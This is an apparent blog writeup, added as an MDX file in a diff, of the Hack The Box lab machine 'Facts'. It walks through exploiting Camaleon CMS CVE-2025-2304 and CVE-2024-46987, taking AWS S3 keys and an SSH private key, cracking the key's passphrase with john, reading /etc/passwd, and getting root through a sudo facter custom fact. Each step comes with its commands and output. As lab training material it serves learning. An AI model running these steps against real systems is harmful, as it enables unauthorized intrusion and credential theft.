@@ -1,0 +1,224 @@
+export const frontmatter = {
+  title: "Hack The Box Facts Machine Writeup",
+  slug: "hack-the-box-facts-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Facts machine, covering Camaleon CMS enumeration, authenticated privilege escalation, arbitrary file read exploitation, AWS S3 credential abuse, SSH key extraction and cracking, and root privilege escalation through misconfigured Facter sudo permissions.",
+  date: "2026-06-07",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Facts Writeup – Camaleon CMS Exploitation to Root via Facter | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Facts writeup demonstrating Camaleon CMS privilege escalation, arbitrary file read, AWS S3 bucket enumeration, SSH private key extraction, passphrase cracking, and root access through Facter sudo misconfiguration.",
+};
+
+## Introduction
+
+Facts is a Linux machine from Hack The Box that focuses on web application exploitation and privilege escalation. The target hosts a vulnerable instance of Camaleon CMS, which allows attackers to escalate privileges and access sensitive configuration data. By leveraging exposed cloud storage credentials and misconfigured Facter sudo permissions, an attacker can ultimately gain full root access to the system
+
+## Setup
+
+Grab IP address from the Machine page, and edit the hosts file under `/etc/hosts` to add a line `<ip_addr> facts.htb` this is done because local system could resolve the domain name to the target machine. The target web server may use virtual host configuration, meaning it serves the intended application only when the correct hostname is provided in the HTTP request
+
+Now download a VPN configuration file from webpage and connect to it via `sudo openvpn file.ovpn`
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name
+
+To check if everything is working fine, we can use `ping <ip_addr>`
+
+## Enumeration
+
+Perform a Nmap scan with version detection with: `nmap -sV 10.129.3.41`
+```bash
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 16:16 IST
+Nmap scan report for facts.htb (10.129.3.41)
+Host is up (0.28s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.26.3 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
+```
+
+This shows we have a SSH server and a web server running on target
+
+Visiting `10.129.3.41` redirects to web app on `http://facts.htb`
+
+With directory brute force we were able to find `/admin` visiting it redirects to `/admin/login`
+
+Now create an account using the Register option
+
+And login with your valid credentials 
+
+On accessing the admin panel you will notice that it runs on `Camaleon CMS` on version `2.9.0`
+
+A quick google search tells that it has 2 CVEs - `CVE-2025-2304` which allows authenticated privilege escalation + s3 configuration leak and `CVE-2024-46987` which allows authenticated arbitrary file read
+
+> Exploit for `CVE-2025-2304` can be found [here](https://github.com/Alien0ne/CVE-2025-2304) and for `CVE-2024-46987` [here](https://github.com/Goultarde/CVE-2024-46987)
+
+## Foothold
+
+Fetch [`CVE-2025-2304`](https://github.com/Alien0ne/CVE-2025-2304) and to escalate privileges, use `python exploit.py -u http://facts.htb -U test -P test`
+```
+[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
+[+]Login confirmed
+   User ID: 5
+   Current User Role: client
+[+]Loading PPRIVILEGE ESCALATION
+   User ID: 5
+   Updated User Role: admin
+[+]Reverting User Role
+```
+
+Now re-login on admin panel with your credentials
+
+Now you will have successfully escalated your privileges
+
+Then navigate to [Settings > General Site > Filesystem Settings](http://facts.htb/admin/settings/site) and grab `Aws s3 access key`, `Aws s3 secret key`, `Aws s3 bucket name`, `Aws s3 region` and `Aws s3 bucket endpoint`
+
+To view contents of the AWS bucket configure the bucket with `aws configure`
+```
+AWS Access Key ID: AKIAE898FD4C5936CC44
+AWS Secret Access Key : 0y7ZK4Qxvdpua1mPMW43DyFyC1KvAc5LsPHqTr9l
+Default region name: us-east-1
+Default output format: json
+```
+
+## Internal Enumeration
+
+We can view available buckets with `aws --endpoint-url http://facts.htb:54321 s3 ls`
+```
+2025-09-11 17:36:52 internal
+2025-09-11 17:36:52 randomfacts
+```
+
+And to view contents we can use `aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/`
+```
+                           PRE .bundle/
+                           PRE .cache/
+                           PRE .ssh/
+2026-01-09 00:15:13        220 .bash_logout
+2026-01-09 00:15:13       3900 .bashrc
+2026-01-09 00:17:17         20 .lesshst
+2026-01-09 00:17:17        807 .profile
+```
+
+And to view content of `internal` bucket we can use `aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --recursive`
+```
+2026-01-09 00:15:13        220 .bash_logout                                                                                                         
+2026-01-09 00:15:13       3900 .bashrc        
+...<SNIP>...
+2026-03-11 16:15:39         82 .ssh/authorized_keys
+2026-03-11 16:15:39        464 .ssh/id_ed25519
+```
+
+We can save contents of `.ssh/id_ed25519` we can use `aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 id_ed25519`
+```
+download: s3://internal/.ssh/id_ed25519 to ./id_ed25519 
+```
+
+> **NOTE:** `id_ed25519` is a private SSH file which can be used to connect to a remote server
+
+We can modify permissions to use it with `chmod 600 id_ed25519`
+
+To connect to SSH server we need a username, therefore we can use `CVE-2024-46987` to read `/etc/passwd`
+
+Fetch [CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987) 
+
+To read arbitrary file use `python CVE-2024-46987.py -u http://facts.htb -l test -p test /etc/passwd`
+```
+root:x:0:0:root:/root:/bin/bash                                                                                                                     
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                     
+bin:x:2:2:bin:/bin:/usr/sbin/nologin       
+...<SNIP>...
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash
+_laurel:x:101:988::/var/log/laurel:/bin/false
+```
+
+This gives us two usernames `trivia` and `william`
+
+So we can connect to SSH server with `ssh -i id_ed25519 trivia@10.129.3.41`
+```
+Enter passphrase for key 'id_ed25519': 
+```
+
+We don't have a passphrase
+
+The passphrase can be cracked with `ssh2john`(which comes from `john` package) using `ssh2john id_ed25519 > id_ed25519.txt` and we can now crack it with `john the ripper` using `john --wordlist=wordlist.txt id_ed25519.txt`
+
+> To crack the hash, we will use [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/Pwdb_top-100000.txt)
+
+We can check if the crack was successful or not with `john --show id_ed25519.txt`
+```
+id_ed25519:dragonballz
+
+1 password hash cracked, 0 left
+```
+
+Now we can connect to SSH server with `ssh -i id_ed25519 trivia@10.129.3.41`
+```
+Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
+Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
+...<SNIP>...
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+trivia@facts:~$ 
+```
+
+Which shows our login was successful
+
+## Privilege Escalation
+
+We can check sudo permissions with `sudo -l`
+```
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+```
+
+NOTE: `/usr/bin/facter` can be executed by all users without password
+
+With `facter` we can escalate our privileges for that
+1. Make a temporary directory with `mkdir /tmp/f/`
+2. Then use `echo 'Facter.add(:x) do setcode { system("/bin/bash") } end' > /tmp/f/x.rb` to write into `/tmp/f/x.rb`
+- `echo '...' > /tmp/f/x.rb` prints the text inside the quotes
+- `Facter.add(:x)` registers a custom fact named `x`
+- `do ... end` block that defines what the fact should do
+- `setcode { ... }` defines the code that will run when the fact is requested
+- `system("/bin/bash")` function executes a shell command on the operating system, which launches a new bash shell
+3. `sudo facter --custom-dir=/tmp/f x` which gives us `root@facts:/tmp/f`
+- `--custom-dir=` forces it load ruby fact files from that particular directory
+
+We have successfully escalated our privileges to root
+
+## Post-Exploitation
+
+Now that we have root access, we can retrieve both flags.
+
+To find the user flag use `find / -name user.txt 2>/dev/null`
+```
+/home/william/user.txt
+```
+
+and to find root flag use `find / -name root.txt 2>/dev/null`
+```
+/root/root.txt
+```
+
+To view the flag use `cat /home/william/user.txt`
+```
+df9...<SNIP>...4c5
+```
+
+and to view root flag use `cat /root/root.txt`
+```
+20c...<SNIP>...82c
+```
